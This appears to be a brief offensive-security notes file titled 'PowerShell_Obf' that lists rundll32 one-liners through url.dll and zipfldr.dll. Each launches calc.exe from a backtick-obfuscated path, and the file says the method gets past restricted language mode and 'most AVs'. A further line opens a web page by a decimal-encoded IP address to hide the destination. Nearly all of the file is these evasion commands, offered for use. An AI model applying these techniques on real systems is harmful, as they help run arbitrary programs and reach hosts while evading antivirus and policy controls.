# PowerShell_Obf

#Calling files in restricted language mode and bypass most AVs
`rundll32 url.dll,FileProtocolHandler file://`C`:`/`W`I`N`D`O`W`S`/`S`Y`S`T`E`M`3`2`/`C`A`L`C`.`E`X`E`

rundll32.exe zipfldr.dll,RouteTheCall file://`C`:`/`W`I`N`D`O`W`S`/`S`Y`S`T`E`M`3`2`/`C`A`L`C`.`E`X`E

rundll32 url.dll,OpenURL file://`C`:`/`W`I`N`D`O`W`S`/`S`Y`S`T`E`M`3`2`/`C`A`L`C`.`E`X`E

#Call a web page via its decimal value
rundll32 url.dll,OpenURL HTTP://`2`9`1`5`2`2`4`9`3`3
